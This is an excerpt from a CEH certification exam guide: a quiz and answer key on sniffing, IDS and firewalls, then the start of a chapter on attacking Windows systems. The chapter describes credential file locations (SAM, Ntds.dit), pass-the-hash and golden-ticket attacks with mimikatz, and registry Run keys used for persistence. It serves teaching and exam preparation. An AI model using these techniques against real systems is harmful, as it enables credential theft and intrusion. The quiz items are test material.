All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

184

Pass (ignore the packet). Be familiar with the basics of Snort rule syntax, as well as the
raw output from the packet capture. Pay special attention in the output to port numbers;
most questions can be answered just by knowing what port numbers go with which pro-
tocol and where to find them in the output. Also, always watch the directional arrows in
test questions.

A firewall is an appliance within a network that is designed to protect internal
resources from unauthorized external access. Firewalls work with a set of rules, explicitly
stating what is allowed to pass from one side of the firewall to the other. Additionally,
most firewalls work with an implicit deny principle, which means if there is not a rule
defined to allow the packet to pass, it is blocked—there is no need to create a rule to
deny packets. The screened subnet (aka public zone) of your DMZ is connected to the
Internet and hosts all the public-facing servers and services your organization provides.
These bastion hosts sit outside your internal firewall and are designed to protect internal
network resources from attack: they’re called bastions because they can withstand Inter-
net traffic attacks. The private zone holds all the internal hosts that no Internet host has
any business dealing with. Lastly, because your firewall has two or more interfaces, it is
referred to as multi-homed.

Originally, firewalls were all packet-filtering firewalls. They basically looked at the
headers of packets coming through a port and decided whether to allow them based on
the ACLs configured. Stateful inspection firewalls give the firewall the means to track the
entire status of a connection. ECC also calls these stateful multilayer inspection firewalls,
with the capability from the Network layer up to the Application layer (although their
focus is in Layers 3 and 4). Circuit-level gateway firewalls work at the Session layer and
allow or prevent data streams—they’re not necessarily concerned with each packet. An
application-level firewall filters traffic much like a proxy—allowing specific applications
(services) in and out of the network based on its rule set.

HTTP tunneling is a firewall-evasion technique. Evasion can also be carried out via
session splicing—a fancy term for fragmentation—where you put payload into packets
the IDS usually ignores.

A honeypot is a system set up as a decoy to entice attackers. There are four types of
honeypots: high, medium, and low interaction, and “pure.” A high-interaction honeypot
simulates all services and applications and is designed to be completely compromised. A
medium-interaction honeypot simulates a real operating system and several applications
and services. A low-interaction honeypot simulates a limited number of services and
cannot be compromised completely (by design). A “pure” honeypot emulates the actual
production network of the organization.

Questions
1. Which of the following best describes a honeypot?

A. It is used to filter traffic from screened subnets.
B. It is used to gather information about potential network attackers.
C. It is used to analyze traffic for detection signatures.
D. Its primary function involves malware and virus protection.

04-ch04.indd 184 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

185

2. Which of the following Wireshark filters would display all traffic sent from, or
destined to, systems on the 172.17.15.0/24 subnet? (Choose all that apply.)
A. ip.addr == 172.17.15.0/24
B. ip.src == 172.17.15.0/24 and ip.dst == 172.17.15.0/24
C. ip.src == 172.17.15.0/24 or ip.dst == 172.17.15.0/24
D. ip.src == 172.17.15.0/24 and ip.dst == 172.17.15.0/24

3. Which of the following best describes active sniffing? (Choose all that apply.)
A. Active sniffing is usually required when hubs are in place.
B. Active sniffing is usually required when switches are in place.
C. Active sniffing is harder to detect than passive sniffing.
D. Active sniffing is easier to detect than passive sniffing.

4. Your client tells you they know beyond a doubt an attacker is sending messages
back and forth from their network, yet the IDS doesn’t appear to be alerting on
the traffic. Which of the following is most likely true?
A. The attacker is sending messages over an SSL tunnel.
B. The attacker has corrupted ACLs on every router in the network.
C. The attacker has set up port security on network switches.
D. The attacker has configured a trunk port on a switch.

5. Which display filter for Wireshark shows all TCP packets containing the
word facebook?
A. content==facebook
B. tcp contains facebook
C. display==facebook
D. tcp.all contains ==facebook

6. You are configuring rules for your Snort installation and want to have an alert
message of “Attempted FTP” on any FTP packet coming from an outside address
intended for one of your internal hosts. Which of the following rules is correct
for this situation?
A. alert tcp $EXTERNAL_NET any -> $HOME_NET 23 (msg:"Attempted FTP")
B. alert tcp $EXTERNAL_NET any -> $HOME_NET 25 (msg:"Attempted FTP")
C. alert tcp $EXTERNAL_NET any -> $HOME_NET 21 (msg:"Attempted FTP")
D. alert tcp $HOME_NET 21 -> $EXTERNAL_NET any (msg:"Attempted FTP")

04-ch04.indd 185 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

186

7. What occurs when an IDS does not properly identify a malicious packet entering
the network?
A. False negative
B. False positive
C. True negative
D. True positive

8. Machine A (with MAC address 00-01-02-AA-BB-CC) and Machine B
(00-01-02-BB-CC-DD) are on the same subnet. Machine C, with address
00-01-02-CC-DD-EE, is on a different subnet. While the attacker is sniffing
on the fully switched network, Machine B sends a message to Machine C.
If an attacker on Machine A wanted to receive a copy of this message, which of
the following circumstances would be necessary?
A. The ARP cache of the router would need to be poisoned, changing the entry

for Machine A to 00-01-02-CC-DD-EE.
B. The ARP cache of Machine B would need to be poisoned, changing the entry

for the default gateway to 00-01-02-AA-BB-CC.
C. The ARP cache of Machine C would need to be poisoned, changing the entry

for the default gateway to 00-01-02-AA-BB-CC.
D. The ARP cache of Machine A would need to be poisoned, changing the entry

for Machine C to 00-01-02-BB-CC-DD.
9. An IDS installed on the network perimeter sees a spike in traffic during off-duty

hours and begins logging and alerting. Which type of IDS is in place?
A. Stateful
B. Signature based
C. Anomaly based
D. Packet filtering

10. In what situation would you employ a proxy server? (Choose the best answer.)
A. You want to share files inside the corporate network.
B. You want to allow outside customers into a corporate website.
C. You want to filter Internet traffic for internal systems.
D. You want to provide IP addresses to internal hosts.

11. An attacker has successfully connected a laptop to a switch port and turned on
a sniffer. The NIC is running in promiscuous mode, and the laptop is left alone
for a few hours to capture traffic. Which of the following statements are true?
(Choose all that apply.)
A. The packet capture will provide the MAC addresses of other machines connected

to the switch.
B. The packet capture will provide only the MAC addresses of the laptop and

the default gateway.

04-ch04.indd 186 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

Chapter 4: Sniffing and Evasion

187

C. The packet capture will display all traffic intended for the laptop.
D. The packet capture will display all traffic intended for the default gateway.

12. Which of the following are appropriate active sniffing techniques against a
switched network? (Choose all that apply.)
A. ARP poisoning
B. MAC flooding
C. SYN flooding
D. Birthday attack
E. Firewalking

13. A pen tester is configuring a Windows laptop for a test. In setting up Wireshark,
what driver and library are required to allow the NIC to work in promiscuous
mode?
A. Libpcap
B. WinProm
C. WinPcap
D. Promsw

14. Which of the following works at Layer 5 of the OSI model?
A. Stateful firewall
B. Packet-filtering firewall
C. Circuit-level firewall
D. Application-level firewall

Answers
1. B. A honeypot is designed to draw attackers in so you can watch what they do,

how they do it, and where they do it from.
2. A, C. In Wireshark filter questions, always pay attention to the operators. While

answer A shows any packet with the correct IP address in it, anywhere, the or
operator in answer C shows packets meeting both options.

3. B, D. If you’re on a hub, why bother with active sniffing techniques? You’re
already seeing everything. Also, active sniffing is much more likely to get you
caught than simply plugging in a wire and sitting back.

4. A. Encryption is the bane of an IDS’s existence. If traffic is encrypted, the IDS is
blind as a bat.

5. B. The appropriate Wireshark display filter is the following:
tcp contains search-string

6. C. Snort rules follow the same syntax:
action protocol src address src port -> dest address port (options)

04-ch04.indd 187 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 4

CEH Certified Ethical Hacker All-in-One Exam Guide

188

7. A. When traffic gets to the IDS, is examined, and is still let through even though
it’s malicious, a false negative has occurred. And a false negative is really, really bad.

8. B. ARP poisoning is done on the machine creating the frame—the sender.
Changing the default gateway entry on the sending machine results in all frames
intended for an IP out of the subnet being delivered to the attacker. Changing
the ARP cache on the other machine or the router is pointless.

9. C. IDSs can be signature or anomaly based. Anomaly-based systems build a
baseline of normal traffic patterns over time, and anything that appears outside
of the baseline is flagged.

10. C. There are a bunch of reasons for having a proxy. In this case, you’re using it to
filter traffic between internal hosts and the rest of the world. Generally, proxies
don’t act as file servers, websites, or DHCP servers.

11. A, C. Switches filter or flood traffic based on the address. Broadcast traffic, such
as ARP requests and answers, is flooded to all ports. Unicast traffic, such as traffic
intended for the laptop itself or the default gateway, is sent only to the port on
which the machine rests.

12. A, B. ARP poisoning can be used to trick a system into sending packets to your
machine instead of recipients (including the default gateway). MAC flooding is
an older attack used to fill a CAM table and make a switch behave like a hub.

13. C. WinPcap is the library used for Windows devices. Libpcap is used on Linux
devices for the same purpose.

14. C. I admit, this one is tricky. Yes, circuit-level firewalls work at Layer 5. Stateful
firewalls can be said to work at Layer 5, but they’re focused on Layers 3 and 4.
Application-level firewalls work at Layer 7.

04-ch04.indd 188 14/09/21 3:54 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CHAPTER

Attacking a System 5
In this chapter you will

• Describe the CEH hacking methodology and system hacking steps
• Explore methods used to gain access to systems
• Examine methods used to escalate privileges
• Describe methods used to maintain access to systems
• Investigate methods o evidence erasure
• Identiy rootkit unction and types
• Identiy basics o Windows and Linux ile structure, directories, and commands

Ever heard of noodling? It’s a really fun and exciting way to fish—if you’re borderline
insane, have no fear of losing a finger, hand, or (in some cases) your life, and feel that
the best way to even things up in the hunt is to actually get in the water with your prey.
Noodling has been around for a long time and involves catching catfish—sometimes
giant, triple-digit-pound catfish—with your bare hands.

The idea is pretty simple. The noodler slowly crawls along the riverbed close to the
bank and searches for holes. These holes can be up in the clay siding of the river, inside a
hollow tree trunk, or under rocks, and they are used by catfish during daylight hours to
rest and prepare for the evening hunt for food. Once the noodler finds a hole, he reaches
his hand, arm, or (depending on the depth of the hole) leg into the hole hoping that a fish
hiding in the hole bites onto the hand, arm, or leg so it can then be drug out of its hiding
place. Of course, occasionally there’s something else in the hole. Like a snake, alligator,
beaver, turtle, or other animal capable of lopping off a digit or two, but hey—what’s life
without a few risks?

Sometimes the hole is so deep the noodler has to go completely underwater to battle
his prey. And sometimes it even leads to a giant underwater lair, with multiple escape
routes for the catfish. In this case, a team of noodlers is needed to cover up every exit hole
from the catfish lair. And, of course, to block the exit holes they don’t use rocks or pieces
of board; instead, they cram their hands, arms, legs, and every other body part into the
openings. As the head noodler goes in for the fish, it will ram into and bite everyone else
while it’s looking for an escape route—because, if nothing else, noodling is about sharing.

No, I’m not making this up. Noodlers catch dinner by having the fish bite onto their
hands and then dragging them out of their holes up to the boat, the stringer, and eventu-
ally the frying pan. They seek out targets, slowly examine and map out every potential

189

05-ch05.indd 189 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

190

avenue in, and take risks to bring home the prize. Occasionally, as just mentioned, they
even use a team to get things done. So, perhaps this may be a weird analogy to kick off
your system hacking efforts, but after all this time preparing, aren’t you ready to get in the
water and get your hands dirty? Even if it means you may get bit? Maybe we have more
in common with noodlers than we thought.

This is the chapter where I start talking about actual system hacking. If you skipped
ahead, go back and check those riverbank holes I covered in the first few chapters. There’s
muddy water up ahead, and I don’t want any accidents.

Getting Started
Before getting started in actual attacks against the system, it’s pretty important that we
take stock of where we’re at. Better stated, we should take stock of where we should be
before attacking a device. We should, at this point, have already gone through footprint-
ing, scanning, and enumeration. We should already have a good high-level view of the
entire landscape, including the network range and all that competitive intelligence we
talked about earlier. We should have already assessed available targets, identified services
and operating systems running on the network, and figured out security flaws and vul-
nerabilities we might find interesting. In short, we should be channeling Sun Tzu and
knowing our enemies (in this case, our targets) better than they know themselves.

If that’s all done, great—the attack phase will go relatively smoothly. If it’s not done,
and not done thoroughly, you’re wasting your time moving forward and should go back
to the beginning. Assuming you’ve paid attention and are following pen test principles so
far, let’s cover a few things you should know about the operating systems you’ll be target-
ing and take a look at the methodology for attacking a system.

Windows Security Architecture
Chapter 3 introduced enumeration and went through all the fun with RIDs and SIDs;
however, there’s a lot more to get to, and this is the best place to get to it. The good news
is, ECC seems to have cut way back on the OS architecture questions, so much of this
section is more for your edification as a budding ethical hacker—and don’t worry, I’ll
point out the items of interest for you.

To properly break down Windows security architecture—at least the remaining parts
of it we care about for our efforts here, anyway—it’s probably best we start by answering
questions such as “Where are passwords stored on the system?” and “How does Windows
authenticate users?” In answer to the first question, what would you say if I told you the
passwords themselves aren’t stored anywhere on the machine? After all, it’d be kind of
stupid to just stick them somewhere on a machine for anyone to grab and steal, right?
Turns out that idea—storing passwords on a machine so they can be used for authentica-
tion while simultaneously figuring out how to protect them from theft—is what brought
about the Security Accounts Manager (SAM) file.

NOTE Want a tool to use or extracting these hashes? Give pwdump7 or
mimikatz a try.

05-ch05.indd 190 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

191

Microsoft Windows stores authentication credentials in the SAM file, located in the
C:\Windows\System32\Config folder. Notice I avoided saying “passwords” because the
purists lose their collective minds and start yelling semantic arguments at the book when
I do. It’s actually more proper to say, “Microsoft Windows stores the hash value of pass-
words in the SAM file.” We’ve got a whole chapter regarding cryptography and encryp-
tion upcoming, but for now just know that a hash is a one-way mathematical algorithm
that produces a unique output for a given input. Since it’s one-way (in other words, you
cannot simply reverse the hash value to the input it came from), storing the hash—and
sending the hash across the wire for authentication—is a pretty good idea.

NOTE You may recall rom the book’s introduction that ECC sometimes
takes liberties with semantics and grammar. Want an example? I’ve seen
reerences in ECC study material to the SAM database, and I didn’t want
anyone to get conused. The SAM is a ile, not a database. It can be copied
and stored elsewhere. It can be modiied. It can’t be queried by SQL, nor is
it a cog in some Oracle wizardry. Active Directory works with passwords in a
database, but not the SAM.

The biggest cause of concern for this method of password storage—and with hashing
in general—is the complexity of the hash algorithm used. While you cannot reverse a
hash, you can certainly steal it and, given enough time to run through variations with
a password-cracking tool, come up with something—quite possibly even the original
password—that matches the hash. Some hash algorithms and methods are more secure
than others, and Microsoft started out with one that became a hacker’s dream.

Hashing passwords in Windows has a long history. Back in the days when people
rewound movies after watching them (those of you who remember the VHS-versus-
Betamax debate are nodding here at the reference), Windows 2000 and Windows
NT–type machines used something called LAN Manager (LM), and then NT LAN
Manager (NTLM), to hash passwords. LM hashing would first take the password and
convert everything to uppercase. Then, if the password was less than 14 characters, it
would add blank spaces to get it to 14. Then the new, all-uppercase, 14-character pass-
word would be split into two 7-character strings. These strings would be hashed sepa-
rately, with both hashes then combined for the output.

NOTE LM authentication (DES) was used with Windows 95/98 machines.
NTLM (DES and MD4) was used with Windows NT machines until SP3. NTLM
v2 (MD5) was used ater that. Kerberos came about with Windows 2000.
All are still important to know and try because many systems keep the
authentication mechanisms around or backward-compatibility reasons.

Obviously, this makes things easier for a hacker. How so, you may be asking? Well,
if a password is seven characters or less (or uses only one or two character spaces in the
second portion), this significantly reduces the amount of time required to crack the
rest of it—because the LM hash value of seven blank characters will always be the same
(AAD3B435B51404EE). For example, consider a password of M@tt123. The entire LM
hash might look like this when we steal it: 9FAF6B755DC38E12AAD3B435B51404EE.

05-ch05.indd 191 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

192

Because we know how the hash is created, we can split it in half to work on each side
separately: 9FAF6B755DC38E12 is the first half, and AAD3B435B51404EE is the
second. The first half we put through a cracker and get to work. The second, though, is
easily recognizable as the hash value of seven blank characters! This tells you the password
is seven characters or less and greatly reduces the amount of time the cracking software
will need to break the password.

NOTE Steps an administrator can take to reduce the risk in regard to
password thet and cracking are airly common sense. Never leave deault
passwords in place ater installs, ollow naming rules with passwords
(no personal names, pet names, birth dates, and so on), require longer
passwords, and change them oten. Additionally, constantly and consistently
check every account with credentials higher than that o a normal user, and
be careul with accounts that have “permanent” passwords. I it’s not going
to be changed, it better be one heck o a good password. Lastly, remember
that keeping an eye on event logs can be helpul in tracking down ailed
attempts at password guessing.

Should you steal a SAM file and look at it, the results usually are pretty ugly (see
Figure 5-1 for an example). There are a lot of characters and asterisks, and not much that
seems to make any sense. In Windows Vista and later, the LM hash is shown as blank
(the NO PASSWORD entries in the SAM file) and the NTLM hash appears second.

Of course, finding an easy-to-crack NTLM hash on your target system won’t necessar-
ily be easy. You first have to steal it (and by “it” I mean the SAM file), usually via physi-
cal access with a bootable CD or maybe even through a copy found on a backup tape.
Even after it has been obtained, though, the addition of salting (additional protection
by adding random data as additional input before being hashed) and the use of better
methods for authentication (NTLMv2 and Kerberos, if you sniff the hash value) make
life for a password cracker pretty tough. Most administrators are wising up and forcing
users to use longer passwords and allowing shorter timeframes in which to keep them.
Furthermore, Windows has gotten much better at password security in the past couple of
decades. LM authentication has six levels available (0 was the Windows XP default, and
2 is the default since 2003), and Kerberos transports the passwords much more securely
than previously. Remember, though, you’re not hunting the healthy—you’re looking for
the weak and overlooked.

User names : SIDs : LM hashes : NTLM hashes : : :

Figure 5-1 SAM ile

05-ch05.indd 192 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

193

NOTE I, during your testing, you happen to come across a domain
controller in your target Windows network, grab the Ntds.dit ESE database
ile (it’s located in %SystemRoot%\NTDS\Ntds.dit or %SystemRoot%\
System32\Ntds.dit). The Ntds.dit ile is eectively the entire Active Directory
in a ile, and it contains all the good stu. There are tools out there to extract
all the hashes rom that ile, and i you get it, you own everything.

Speaking of the healthy, we should spend some time talking about the Windows
default authentication protocol/method, Kerberos. Kerberos makes use of both sym-
metric and asymmetric encryption technologies to securely transmit passwords and keys
across a network. The entire process is made up of a Key Distribution Center (KDC), an
Authentication Service (AS), a Ticket Granting Service (TGS), and the Ticket Granting
Ticket (TGT).

NOTE Where did the name Kerberos come rom? Glad you asked. Some
very geeky olks got together in something called the Athena Project at
the Massachusetts Institute o Technology (MIT) and created a brand-new
authentication mechanism. As geeks are wont to do, they decided to name
it something cool, and what’s cooler than a three-headed dog guarding the
gates o Hades? “Kerberos” it was, and nerds everywhere rejoiced.

A basic Kerberos exchange follows a few easy but secure steps. The client first asks
the KDC (which holds the AS and TGS) for a ticket, which will be used to authenticate
throughout the network. This request is in clear text. The server responds with a secret
key, which is hashed by the password copy kept on the server (in Active Directory). This
is known as the TGT. If the client can decrypt the message (and it should since it knows
the password), the TGT is sent back to the server requesting a TGS service ticket. The
server responds with the service ticket, and the client is allowed to log on and access net-
work resources. See Figure 5-2 for a display of this exchange.

You’ll note that, once again, the password itself is never sent. Instead, a hash value of
the password, encrypted with a secret key known only by both parties and good only for
that session, is all that’s sent. This doesn’t mean the password is unbreakable; it just means

Key Distribution Center

Step 1 – Client request to Authentication Server.

Step 2 – Ticket Granting Ticket sent (AS response
to client, which includes a secret key). AS

Step 3 – Client decodes TGT and sends request to Database
the TGS for a service ticket. server

Step 4 – TGS responds with ticket allowing
access to network resources. TGS

Figure 5-2 Kerberos in action

05-ch05.indd 193 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

194

it’s going to take a lot of time and effort. Tools like KerbSniff and KerbCrack used be to
options, but have been largely deprecated in use for the past few years. Most password
attacks involving these hashes (obtained in a variety of means) are now performed offline,
used a GPU and other tools.

NOTE I eel compelled—not only because o my tech editor’s endless
hounding on the subject but also because o my own itchy security
conscience—to point out here, one more time, that password length should
be your primary concern in securing your systems. The length o a password
is mathematically more important than the complexity o a password. Don’t
all victim to the allacy that what is diicult to remember is what must be
diicult to guess; complexity requirements are not a replacement or length.
Math does not lie: Thisismypassphraseyouwhiner is enormously more secure
than rdg#23U~!k.

Willy Wonka’s Hack
SAM files are great and all, and if you crack those hashes before they change the
password, access to the local machine will certainly get you a launching pad for
all sorts of other attacks—not to mention anything stored locally. But what if you
thought bigger? Suppose, for example, I were to tell you about a ticket you could
create—a ticket that would grant you not only local access, but domain-level access
for as long as you want as well.

The “golden ticket” is just that—a key to the kingdom. The idea is an attacker
creates his own Kerberos TGT that is presented to the TGS and, voilà, domain
access. If done right, the ticket grants domain admin rights for...well, for as long as
you want. How does one accomplish this grand feat? By gathering a little informa-
tion and using a few cool tools.

It turns out that although Windows doesn’t store the actual password anywhere
on its system and tries really hard to restrict access to the local store of the hashes
(SAM file), it does store those hashes in memory while the user is logged on. This
makes sense when you think about it, because otherwise the user would have to
log in every time he or she accessed anything. The hashes are loaded into the Local
Security Authority Subsystem (Lsass), which runs as an executable (%System-
Root%\System32\Lsass.exe) and is responsible for a variety of tasks, including user
authentication. At any rate, those hashes are stored in a method that allows them to
be stolen (and reversed if you really want the password itself ).

Armed with this knowledge, you can pull off a pass-the-hash attack. There’s a lot
of background technobabble involved, but in short the attacker never bothers crack-
ing a password—he just steals the hash and sends it instead. First up, you need to
steal hashes from users already connected to your target server. Next, using specific
tools, you basically copy and paste one of the hashes (preferably a hash from a user
with administrative privileges) in your local Lsass. Bingo! Afterward, Windows will
happily begin providing the new credentials you’ve stolen whenever you access the
target. And best of all, you never have to provide or even know the password.

05-ch05.indd 194 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

195

The de facto standard tool for pulling off this kind of attack is called mimikatz
(https://github.com/gentilkiwi/mimikatz). Mimikatz allows you to extract pass-
words in plain text, stealing hashes, PIN code, and Kerberos tickets from mem-
ory, and can also perform pass-the-hash, pass-the-ticket or build Golden tickets.
Metasploit has even included mimikatz as a meterpreter script, which allows easy
access to all features without uploading any additional files to the target host.

As for the golden ticket itself, the idea is astounding and, with a little bit of
luck, relatively easy to pull off. Assuming you have some sort of foothold in the
target domain (owning a single system, and so on), you need to obtain the domain
name, a domain admin name, the domain SID, and the Kerberos TGT hash from
the domain controller. Using mimikatz (the example I saw also made use of Cobalt
Strike as well), these can be added together with the golden_ticket_create command
and—boom—your access is guaranteed. Even if the security team changes all pass-
words and reboots all systems, you can again use mimikatz’s kerberos_ticket_use
command to elevate immediately to domain admin.

Sure, it’s a little more involved than opening a Wonka bar and battling Veruca
Salt and Augustus Gloop, but it’s ever so much sweeter.

One more quick note here: The plain-text dump of passwords doesn’t really work
often anymore in Windows 10 or Windows Server 16 and later. Mainly, the specific
authentication mechanism that did this is disabled by default, and requires some
unique effort to turn on again. For details on this technique and some other great
techniques that you can use to get passwords out of Windows, check out http://
woshub.com/how-to-get-plain-text-passwords-of-windows-users/.

The Registry
The Windows registry is a collection of all the settings and configurations that make the
system run. Hierarchical in nature, this database of configuration databases (as stated in
more than a few Microsoft definitions of the registry) stores a variety of configuration
settings and options. In it, you can find settings for low-level operating system compo-
nents, applications running on the machine, drivers, the SAM file, and the user interface.

Two basic elements make up a registry setting: keys and values. A key can be thought
of as a location pointer (much like a folder in the regular file structure), and the value
of that key defines the setting. Keys are arranged in a hierarchy, with root keys at the
top, leading downward to more specific settings. The root-level keys in the registry are
as follows:

• HKEY_LOCAL_MACHINE (HKLM) Contains information on hardware
(processor type, bus architecture, video, disk I/O, and so on) and software
(operating system, drivers, services, security, and installed applications).

• HKEY_CLASSES_ROOT (HKCR) Contains information on file associations
and Object Linking and Embedding (OLE) classes.

05-ch05.indd 195 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

196

• HKEY_CURRENT_USER (HKCU) Contains profile information for the
user currently logged on. Information includes user-level preferences for the OS
and applications.

• HKEY_USERS (HKU) Contains specific user configuration information for
all currently active users on the computer.

• HKEY_CURRENT_CONFIG (HKCC) Contains a pointer to HKEY_LOCAL_
MACHINE\SYSTEM\CurrentControlSet\CurrentControlSet\Hardware Profiles\
Current, designed to make accessing and editing this profile information easier.

There are a dozen or so values that can be placed in a given key location. These values
can be a character string (REG_SZ), an “expandable” string value (REG_EXPAND_
SZ), a binary value (REG_BINARY), or a host of other entries. Remaining entries of
note to you include the DWORD value (REG_DWORD—a 32-bit unsigned integer),
the link value (REG_LINK—a symbolic link to another key), and the multisize value
(REG_MULTI_SZ—a multistring value). For example, you can navigate to HKCU\
Software\Microsoft\Notepad and look at the lfFaceName value to see the default font
type displayed in Notepad. Change the REG_SZ entry to the font name of your choice
(TIMES NEW ROMAN, ARIAL, and so on), and Notepad will happily oblige the
next time it opens. And if you’re annoyed by the consistent Windows Update pop-ups,
screens, and slowdowns, navigate to HKLM\Software\Policies\Microsoft\Windows\
WindowsUpdate\ and check out all you can adjust there.

NOTE Strangely enough, the term registry hacking doesn’t engender visions
o security breaks in the minds o most olks. Rather, people think o registry
hacking as simply cool things you can do with your computer to make it run
aster, look nerdier, or do weird stu or un and amusement. Run a browser
search or “Windows Registry hacks” and you’ll see what I mean. Have un,
but be careul—the registry can bite.

Of course, these examples are just for fun, but obviously you can see how knowledge
of the registry and its use can help you out greatly in your pen test job. If you can get
access to the registry, you can set up all kinds of mischief on the device. Some of these
keys even set up applications and services to run at startup or to keep trying to start if the
pesky user (or his security tools) gets in the way. Some of the keys of great importance to
you in particular (for your exam and your job) include the following:

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServicesOnce

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunServices

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
RunOnce

• HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run

05-ch05.indd 196 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

Chapter 5: Attacking a System

197

NOTE Did you know Windows records the most recent commands executed
by the current user in the registry (HKCU\Sotware\Microsot\Windows\
CurrentVersion\Explorer\RunMRU)? The HKEY\USERSID\Sotware\Microsot\
Windows\CurrentVersion\Explorer\RecentDoc entries can show you the most
recently accessed iles. And how about which systems the user has been talking
to lately? Just check out HKCU\Sotware\Microsot\Windows\CurrentVersion\
Explorer\ComputerDescriptions. There are bunches more o these little tidbits
in the registry—do some searching and see what you can ind.

Lastly, accessing and editing the registry is fairly simple (provided you have the right
permission and access) with a variety of tools and methods. There is always the built-in
command-line favorite reg.exe, which can be used for viewing and editing. If you’re not
seeking to impress someone with your command-line brilliance or, like me, you just pre-
fer the ease of a GUI, you can stick with the regedit.exe or regedt32.exe application built
into every Windows system. Both open the registry in an easy-to-view folder layout, but
regedt32 is the preferred editor by Microsoft.

The MMC
Windows, by its nature, is an easy-to-use, intuitive (except maybe for Windows 8)
operating system allowing most users to just sit down and go to work. Occasionally,
though, there are a few tasks that administrative folks need to look at and take care
of—especially in an enterprise environment. Sure, there are GUI-based options for their
use, but there are actually command-line ones as well. This is not an MCSE book, nor
is it intended to cover every single aspect of Windows administrative tasks, so we’re only
going to hit a couple of those areas to give you a basic understanding of what you’ll need
for your exam.

First on the list of new items to cover is the concept of Microsoft Management Con-
soles (MMCs). MMCs have been around for a long while in Microsoft Windows and
are basically small GUI containers for specific tools. Each MMC holds an administrative
tool for a given task, added in the console as a “snap-in,” and is named for that task. For
example, there is an MMC named Group Policy Editor that, amazingly enough, allows
an admin to edit the group policy. Other MMCs include Computer Management, Event
Viewer, and Services, along with many more.

EXAM TIP There is so much more in Windows architecture or you to explore
than can be put in any single book. For example, were you aware o the
route commands in Windows? Standard users normally rely on external
gateways to route stu around, but you can direct Windows to route traic
at the box itsel. Typing route print will show your local route table. Typing
route ADD destination_network MASK subnet_mask gateway_ip metric_
cost allows you to add an entry to the route table and exert control over
data routing locally.

05-ch05.indd 197 14/09/21 3:55 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 5

CEH Certified Ethical Hacker All-in-One Exam Guide

198

Spectre and Meltdown
One final note in this section on attacking a system deals with a couple of items you will
definitely see on your exam. Vulnerabilities and attacks are so commonplace, most of
them simply come and go with nothing more than an assigned CVE number or a brief
mention during the weekly security briefing. But every so often something comes along
that is so far reaching, that causes so much havoc, it not only gets its own name, but an
icon. In June 2017, Google researchers advised Intel of a significant vulnerability in most,
if not all, of its processors. As it turned out, the flaw wasn’t only in Intel processors—
Apple, AMD, ARM, Samsung, and Qualcomm all were affected—but it was much more
than just a common concern.

Intel (and other) manufacturers have relentlessly pursued means and methods to
improve optimization and performance, and one trek taken was with something called
“speculative processing.” And it’s exactly what it sounds like—the processor predicts
(guesses) what the next execution will be in order to speed everything up. For example, if
an application includes multiple conditional statements, the processor will start execut-
ing and concluding all possible outputs before the app asks for them.

So how does this help an attacker? Well, Google researchers figured out you can force
the processor to speculatively execute a read before bounds checking is performed, which
allows reading of out-of-bound memory locations and can force the processor to go to
places it wasn’t supposed to. For example, a bad guy could request access to a memory
location not allowed while simultaneously sending requests to conditionally read an
allowed memory location. The processor will use speculative execution before executing
the request, so while it will note the first request is not allowed or is invalid, speculative
execution will have run it anyway and the results from both will remain in cache memory
(Spectre). Attackers could also use this to force an unprivileged process to read adjacent
memory locations, revealing all sorts of critical, sensitive information (Meltdown).

Spectre and Meltdown both took advantage of speculative processing (in slightly dif-
ferent ways), and while you needed some level of access already in place to take advantage
of it, the pure numbers of affected, vulnerable systems made these attacks extremely con-
cerning and kept a lot of security folks awake for many a night. Malware systems did not,
and still don’t, do a good job of alerting on the attacks, and even if you do fall victim to
one, there’s almost no evidence it even occurred. Patches, updates, and fix actions do exist
(EC-Council directly points out activities like patching, continuous monitoring, data loss
prevention measures, and blocking unnecessary services as mitigation efforts), and there are
tools available specifically for detecting these in your environment, but as we’ve seen with
other exploits, that doesn’t necessarily mean all systems in your environment are protected.

Linux Security Architecture
Although the great majority of machines you’ll see on your pen tests (and covered on
your exam) are Windows boxes, Linux comes in more flavors than your local ice cream
shop can come up with and is largely available for free, so you’ll see it pop up all over
the place. Additionally, administrators seem to put a larger and larger percentage of their
